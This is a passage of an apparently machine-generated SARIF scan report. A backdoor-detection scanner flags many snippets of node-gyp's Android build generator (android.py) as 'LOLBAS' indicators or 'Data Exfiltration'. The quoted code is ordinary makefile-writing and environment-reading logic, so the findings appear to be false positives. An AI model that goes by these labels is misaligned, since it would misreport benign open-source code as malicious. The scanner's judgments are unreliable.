                    "rendered": {
                      "text": "        # Update global list of target outputs, used in dependency tracking.\n        target_outputs[qualified_target] = (\"path\", self.output_binary)\n\n        # Update global list of link dependencies.\n        if self.type == \"static_library\":\n            target_link_deps[qualified_target] = (\"static\", self.android_module)\n        elif self.type == \"shared_library\":\n",
                      "markdown": "`        # Update global list of target outputs, used in dependency tracking.\n        target_outputs[qualified_target] = (\"path\", self.output_binary)\n\n        # Update global list of link dependencies.\n        if self.type == \"static_library\":\n            target_link_deps[qualified_target] = (\"static\", self.android_module)\n        elif self.type == \"shared_library\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 241,
                  "startColumn": 9,
                  "endLine": 241,
                  "endColumn": 17,
                  "snippet": {
                    "text": "            spec, configs, deps, link_deps, part_of_all, write_alias_target\n        )\n\n        # Update global list of target outputs, used in dependency tracking.\n        target_outputs[qualified_target] = (\"path\", self.output_binary)\n\n        # Update global list of link dependencies.\n",
                    "rendered": {
                      "text": "            spec, configs, deps, link_deps, part_of_all, write_alias_target\n        )\n\n        # Update global list of target outputs, used in dependency tracking.\n        target_outputs[qualified_target] = (\"path\", self.output_binary)\n\n        # Update global list of link dependencies.\n",
                      "markdown": "`            spec, configs, deps, link_deps, part_of_all, write_alias_target\n        )\n\n        # Update global list of target outputs, used in dependency tracking.\n        target_outputs[qualified_target] = (\"path\", self.output_binary)\n\n        # Update global list of link dependencies.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 1085,
                  "startColumn": 5,
                  "endLine": 1085,
                  "endColumn": 11,
                  "snippet": {
                    "text": "    # as the Android build system expects.\n    root_makefile.write(\"\\nLOCAL_PATH := $(call my-dir)\\n\")\n\n    # Find the list of targets that derive from the gyp file(s) being built.\n    needed_targets = set()\n    for build_file in params[\"build_files\"]:\n        for target in gyp.common.AllTargets(target_list, target_dicts, build_file):\n",
                    "rendered": {
                      "text": "    # as the Android build system expects.\n    root_makefile.write(\"\\nLOCAL_PATH := $(call my-dir)\\n\")\n\n    # Find the list of targets that derive from the gyp file(s) being built.\n    needed_targets = set()\n    for build_file in params[\"build_files\"]:\n        for target in gyp.common.AllTargets(target_list, target_dicts, build_file):\n",
                      "markdown": "`    # as the Android build system expects.\n    root_makefile.write(\"\\nLOCAL_PATH := $(call my-dir)\\n\")\n\n    # Find the list of targets that derive from the gyp file(s) being built.\n    needed_targets = set()\n    for build_file in params[\"build_files\"]:\n        for target in gyp.common.AllTargets(target_list, target_dicts, build_file):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 1080,
                  "startColumn": 47,
                  "endLine": 1080,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\n    root_makefile.write(header)\n\n    # We set LOCAL_PATH just once, here, to the top of the project tree. This\n    # allows all the other paths we use to be relative to the Android.mk file,\n    # as the Android build system expects.\n    root_makefile.write(\"\\nLOCAL_PATH := $(call my-dir)\\n\")\n",
                    "rendered": {
                      "text": "\n    root_makefile.write(header)\n\n    # We set LOCAL_PATH just once, here, to the top of the project tree. This\n    # allows all the other paths we use to be relative to the Android.mk file,\n    # as the Android build system expects.\n    root_makefile.write(\"\\nLOCAL_PATH := $(call my-dir)\\n\")\n",
                      "markdown": "`\n    root_makefile.write(header)\n\n    # We set LOCAL_PATH just once, here, to the top of the project tree. This\n    # allows all the other paths we use to be relative to the Android.mk file,\n    # as the Android build system expects.\n    root_makefile.write(\"\\nLOCAL_PATH := $(call my-dir)\\n\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 1025,
                  "startColumn": 3,
                  "endLine": 1025,
                  "endColumn": 8,
                  "snippet": {
                    "text": "    # The android backend only supports the default configuration.\n    options = params[\"options\"]\n    makefile = os.path.abspath(os.path.join(options.toplevel_dir, \"GypAndroid.mk\"))\n    env = dict(os.environ)\n    env[\"ONE_SHOT_MAKEFILE\"] = makefile\n    arguments = [\"make\", \"-C\", os.environ[\"ANDROID_BUILD_TOP\"], \"gyp_all_modules\"]\n    print(\"Building: %s\" % arguments)\n",
                    "rendered": {
                      "text": "    # The android backend only supports the default configuration.\n    options = params[\"options\"]\n    makefile = os.path.abspath(os.path.join(options.toplevel_dir, \"GypAndroid.mk\"))\n    env = dict(os.environ)\n    env[\"ONE_SHOT_MAKEFILE\"] = makefile\n    arguments = [\"make\", \"-C\", os.environ[\"ANDROID_BUILD_TOP\"], \"gyp_all_modules\"]\n    print(\"Building: %s\" % arguments)\n",
                      "markdown": "`    # The android backend only supports the default configuration.\n    options = params[\"options\"]\n    makefile = os.path.abspath(os.path.join(options.toplevel_dir, \"GypAndroid.mk\"))\n    env = dict(os.environ)\n    env[\"ONE_SHOT_MAKEFILE\"] = makefile\n    arguments = [\"make\", \"-C\", os.environ[\"ANDROID_BUILD_TOP\"], \"gyp_all_modules\"]\n    print(\"Building: %s\" % arguments)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 994,
                  "startColumn": 54,
                  "endLine": 994,
                  "endColumn": 59,
                  "snippet": {
                    "text": "\n    def LocalPathify(self, path):\n        \"\"\"Convert a subdirectory-relative path into a normalized path which starts\n        with the make variable $(LOCAL_PATH) (i.e. the top of the project tree).\n        Absolute paths, or paths that contain variables, are just normalized.\"\"\"\n        if \"$(\" in path or os.path.isabs(path):\n            # path is not a file in the project tree in this case, but calling\n",
                    "rendered": {
                      "text": "\n    def LocalPathify(self, path):\n        \"\"\"Convert a subdirectory-relative path into a normalized path which starts\n        with the make variable $(LOCAL_PATH) (i.e. the top of the project tree).\n        Absolute paths, or paths that contain variables, are just normalized.\"\"\"\n        if \"$(\" in path or os.path.isabs(path):\n            # path is not a file in the project tree in this case, but calling\n",
                      "markdown": "`\n    def LocalPathify(self, path):\n        \"\"\"Convert a subdirectory-relative path into a normalized path which starts\n        with the make variable $(LOCAL_PATH) (i.e. the top of the project tree).\n        Absolute paths, or paths that contain variables, are just normalized.\"\"\"\n        if \"$(\" in path or os.path.isabs(path):\n            # path is not a file in the project tree in this case, but calling\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 752,
                  "startColumn": 57,
                  "endLine": 752,
                  "endColumn": 62,
                  "snippet": {
                    "text": "\n    def NormalizeIncludePaths(self, include_paths):\n        \"\"\"Normalize include_paths.\n        Convert absolute paths to relative to the Android top directory.\n\n        Args:\n          include_paths: A list of unprocessed include paths.\n",
                    "rendered": {
                      "text": "\n    def NormalizeIncludePaths(self, include_paths):\n        \"\"\"Normalize include_paths.\n        Convert absolute paths to relative to the Android top directory.\n\n        Args:\n          include_paths: A list of unprocessed include paths.\n",
                      "markdown": "`\n    def NormalizeIncludePaths(self, include_paths):\n        \"\"\"Normalize include_paths.\n        Convert absolute paths to relative to the Android top directory.\n\n        Args:\n          include_paths: A list of unprocessed include paths.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 674,
                  "startColumn": 34,
                  "endLine": 674,
                  "endColumn": 40,
                  "snippet": {
                    "text": "        \"\"\"Return the 'output basename' of a gyp spec, split into filename + ext.\n\n        Android libraries must be named the same thing as their module name,\n        otherwise the linker can't find them, so product_name and so on must be\n        ignored if we are building a library, and the \"lib\" prepending is\n        not done for Android.\n        \"\"\"\n",
                    "rendered": {
                      "text": "        \"\"\"Return the 'output basename' of a gyp spec, split into filename + ext.\n\n        Android libraries must be named the same thing as their module name,\n        otherwise the linker can't find them, so product_name and so on must be\n        ignored if we are building a library, and the \"lib\" prepending is\n        not done for Android.\n        \"\"\"\n",
                      "markdown": "`        \"\"\"Return the 'output basename' of a gyp spec, split into filename + ext.\n\n        Android libraries must be named the same thing as their module name,\n        otherwise the linker can't find them, so product_name and so on must be\n        ignored if we are building a library, and the \"lib\" prepending is\n        not done for Android.\n        \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 620,
                  "startColumn": 47,
                  "endLine": 620,
                  "endColumn": 51,
                  "snippet": {
                    "text": "                local_file = root + local_cpp_extension\n            if local_file != source:\n                self.WriteLn(f\"{local_file}: {self.LocalPathify(source)}\")\n                self.WriteLn(\"\\tmkdir -p $(@D); cp $< $@\")\n                origin_src_dirs.append(os.path.dirname(source))\n            final_generated_sources.append(local_file)\n\n",
                    "rendered": {
                      "text": "                local_file = root + local_cpp_extension\n            if local_file != source:\n                self.WriteLn(f\"{local_file}: {self.LocalPathify(source)}\")\n                self.WriteLn(\"\\tmkdir -p $(@D); cp $< $@\")\n                origin_src_dirs.append(os.path.dirname(source))\n            final_generated_sources.append(local_file)\n\n",
                      "markdown": "`                local_file = root + local_cpp_extension\n            if local_file != source:\n                self.WriteLn(f\"{local_file}: {self.LocalPathify(source)}\")\n                self.WriteLn(\"\\tmkdir -p $(@D); cp $< $@\")\n                origin_src_dirs.append(os.path.dirname(source))\n            final_generated_sources.append(local_file)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 571,
                  "startColumn": 19,
                  "endLine": 571,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        extra_sources = filter(make.Compilable, extra_sources)\n\n        # Determine and output the C++ extension used by these sources.\n        # We simply find the first C++ file and use that extension.\n        all_sources = sources + extra_sources\n        local_cpp_extension = \".cpp\"\n        for source in all_sources:\n",
                    "rendered": {
                      "text": "        extra_sources = filter(make.Compilable, extra_sources)\n\n        # Determine and output the C++ extension used by these sources.\n        # We simply find the first C++ file and use that extension.\n        all_sources = sources + extra_sources\n        local_cpp_extension = \".cpp\"\n        for source in all_sources:\n",
                      "markdown": "`        extra_sources = filter(make.Compilable, extra_sources)\n\n        # Determine and output the C++ extension used by these sources.\n        # We simply find the first C++ file and use that extension.\n        all_sources = sources + extra_sources\n        local_cpp_extension = \".cpp\"\n        for source in all_sources:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 297,
                  "startColumn": 56,
                  "endLine": 297,
                  "endColumn": 61,
                  "snippet": {
                    "text": "            cd_action = \"cd $(gyp_local_path)/%s; \" % self.path\n            command = cd_action + command\n\n            # The makefile rules are all relative to the top dir, but the gyp actions\n            # are defined relative to their containing dir.  This replaces the gyp_*\n            # variables for the action rule with an absolute version so that the\n            # output goes in the right place.\n",
                    "rendered": {
                      "text": "            cd_action = \"cd $(gyp_local_path)/%s; \" % self.path\n            command = cd_action + command\n\n            # The makefile rules are all relative to the top dir, but the gyp actions\n            # are defined relative to their containing dir.  This replaces the gyp_*\n            # variables for the action rule with an absolute version so that the\n            # output goes in the right place.\n",
                      "markdown": "`            cd_action = \"cd $(gyp_local_path)/%s; \" % self.path\n            command = cd_action + command\n\n            # The makefile rules are all relative to the top dir, but the gyp actions\n            # are defined relative to their containing dir.  This replaces the gyp_*\n            # variables for the action rule with an absolute version so that the\n            # output goes in the right place.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 1038,
                  "startColumn": 32,
                  "endLine": 1038,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n    android_top_dir = os.environ.get(\"ANDROID_BUILD_TOP\")\n    assert android_top_dir, \"$ANDROID_BUILD_TOP not set; you need to run lunch.\"\n\n    def CalculateMakefilePath(build_file, base_name):\n",
                    "rendered": {
                      "text": "    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n    android_top_dir = os.environ.get(\"ANDROID_BUILD_TOP\")\n    assert android_top_dir, \"$ANDROID_BUILD_TOP not set; you need to run lunch.\"\n\n    def CalculateMakefilePath(build_file, base_name):\n",
                      "markdown": "`    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n    android_top_dir = os.environ.get(\"ANDROID_BUILD_TOP\")\n    assert android_top_dir, \"$ANDROID_BUILD_TOP not set; you need to run lunch.\"\n\n    def CalculateMakefilePath(build_file, base_name):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 1037,
                  "startColumn": 33,
                  "endLine": 1037,
                  "endColumn": 38,
                  "snippet": {
                    "text": "    generator_flags = params.get(\"generator_flags\", {})\n    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n    android_top_dir = os.environ.get(\"ANDROID_BUILD_TOP\")\n    assert android_top_dir, \"$ANDROID_BUILD_TOP not set; you need to run lunch.\"\n\n",
                    "rendered": {
                      "text": "    generator_flags = params.get(\"generator_flags\", {})\n    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n    android_top_dir = os.environ.get(\"ANDROID_BUILD_TOP\")\n    assert android_top_dir, \"$ANDROID_BUILD_TOP not set; you need to run lunch.\"\n\n",
                      "markdown": "`    generator_flags = params.get(\"generator_flags\", {})\n    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n    android_top_dir = os.environ.get(\"ANDROID_BUILD_TOP\")\n    assert android_top_dir, \"$ANDROID_BUILD_TOP not set; you need to run lunch.\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 1036,
                  "startColumn": 41,
                  "endLine": 1036,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n    android_top_dir = os.environ.get(\"ANDROID_BUILD_TOP\")\n    assert android_top_dir, \"$ANDROID_BUILD_TOP not set; you need to run lunch.\"\n",
                    "rendered": {
                      "text": "    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n    android_top_dir = os.environ.get(\"ANDROID_BUILD_TOP\")\n    assert android_top_dir, \"$ANDROID_BUILD_TOP not set; you need to run lunch.\"\n",
                      "markdown": "`    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n    android_top_dir = os.environ.get(\"ANDROID_BUILD_TOP\")\n    assert android_top_dir, \"$ANDROID_BUILD_TOP not set; you need to run lunch.\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 1035,
                  "startColumn": 41,
                  "endLine": 1035,
                  "endColumn": 46,
                  "snippet": {
                    "text": "def GenerateOutput(target_list, target_dicts, data, params):\n    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n    android_top_dir = os.environ.get(\"ANDROID_BUILD_TOP\")\n",
                    "rendered": {
                      "text": "def GenerateOutput(target_list, target_dicts, data, params):\n    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n    android_top_dir = os.environ.get(\"ANDROID_BUILD_TOP\")\n",
                      "markdown": "`def GenerateOutput(target_list, target_dicts, data, params):\n    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n    android_top_dir = os.environ.get(\"ANDROID_BUILD_TOP\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 1034,
                  "startColumn": 28,
                  "endLine": 1034,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\ndef GenerateOutput(target_list, target_dicts, data, params):\n    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n",
                    "rendered": {
                      "text": "\ndef GenerateOutput(target_list, target_dicts, data, params):\n    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n",
                      "markdown": "`\ndef GenerateOutput(target_list, target_dicts, data, params):\n    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    limit_to_target_all = generator_flags.get(\"limit_to_target_all\", False)\n    write_alias_targets = generator_flags.get(\"write_alias_targets\", True)\n    sdk_version = generator_flags.get(\"aosp_sdk_version\", 0)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 904,
                  "startColumn": 23,
                  "endLine": 904,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        if self.type != \"none\":\n            self.WriteTargetFlags(spec, configs, link_deps)\n\n        settings = spec.get(\"aosp_build_settings\", {})\n        if settings:\n            self.WriteLn(\"### Set directly by aosp_build_settings.\")\n            for k, v in settings.items():\n",
                    "rendered": {
                      "text": "        if self.type != \"none\":\n            self.WriteTargetFlags(spec, configs, link_deps)\n\n        settings = spec.get(\"aosp_build_settings\", {})\n        if settings:\n            self.WriteLn(\"### Set directly by aosp_build_settings.\")\n            for k, v in settings.items():\n",
                      "markdown": "`        if self.type != \"none\":\n            self.WriteTargetFlags(spec, configs, link_deps)\n\n        settings = spec.get(\"aosp_build_settings\", {})\n        if settings:\n            self.WriteLn(\"### Set directly by aosp_build_settings.\")\n            for k, v in settings.items():\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 859,
                  "startColumn": 37,
                  "endLine": 859,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n        if self.type != \"static_library\":\n            for configname, config in sorted(configs.items()):\n                ldflags = list(config.get(\"ldflags\", []))\n                self.WriteLn(\"\")\n                self.WriteList(ldflags, \"LOCAL_LDFLAGS_%s\" % configname)\n            self.WriteList(ldflags_libs, \"LOCAL_GYP_LIBS\")\n",
                    "rendered": {
                      "text": "\n        if self.type != \"static_library\":\n            for configname, config in sorted(configs.items()):\n                ldflags = list(config.get(\"ldflags\", []))\n                self.WriteLn(\"\")\n                self.WriteList(ldflags, \"LOCAL_LDFLAGS_%s\" % configname)\n            self.WriteList(ldflags_libs, \"LOCAL_GYP_LIBS\")\n",
                      "markdown": "`\n        if self.type != \"static_library\":\n            for configname, config in sorted(configs.items()):\n                ldflags = list(config.get(\"ldflags\", []))\n                self.WriteLn(\"\")\n                self.WriteList(ldflags, \"LOCAL_LDFLAGS_%s\" % configname)\n            self.WriteList(ldflags_libs, \"LOCAL_GYP_LIBS\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 854,
                  "startColumn": 43,
                  "endLine": 854,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        # Libraries (i.e. -lfoo)\n        # These must be included even for static libraries as some of them provide\n        # implicit include paths through the build system.\n        libraries = gyp.common.uniquer(spec.get(\"libraries\", []))\n        static_libs, dynamic_libs, ldflags_libs = self.FilterLibraries(libraries)\n\n        if self.type != \"static_library\":\n",
                    "rendered": {
                      "text": "        # Libraries (i.e. -lfoo)\n        # These must be included even for static libraries as some of them provide\n        # implicit include paths through the build system.\n        libraries = gyp.common.uniquer(spec.get(\"libraries\", []))\n        static_libs, dynamic_libs, ldflags_libs = self.FilterLibraries(libraries)\n\n        if self.type != \"static_library\":\n",
                      "markdown": "`        # Libraries (i.e. -lfoo)\n        # These must be included even for static libraries as some of them provide\n        # implicit include paths through the build system.\n        libraries = gyp.common.uniquer(spec.get(\"libraries\", []))\n        static_libs, dynamic_libs, ldflags_libs = self.FilterLibraries(libraries)\n\n        if self.type != \"static_library\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 791,
                  "startColumn": 38,
                  "endLine": 791,
                  "endColumn": 43,
                  "snippet": {
                    "text": "        module names instead of being passed to the linker as flags.\n\n        Args:\n          libraries: the value of spec.get('libraries')\n        Returns:\n          A tuple (static_lib_modules, dynamic_lib_modules, ldflags)\n        \"\"\"\n",
                    "rendered": {
                      "text": "        module names instead of being passed to the linker as flags.\n\n        Args:\n          libraries: the value of spec.get('libraries')\n        Returns:\n          A tuple (static_lib_modules, dynamic_lib_modules, ldflags)\n        \"\"\"\n",
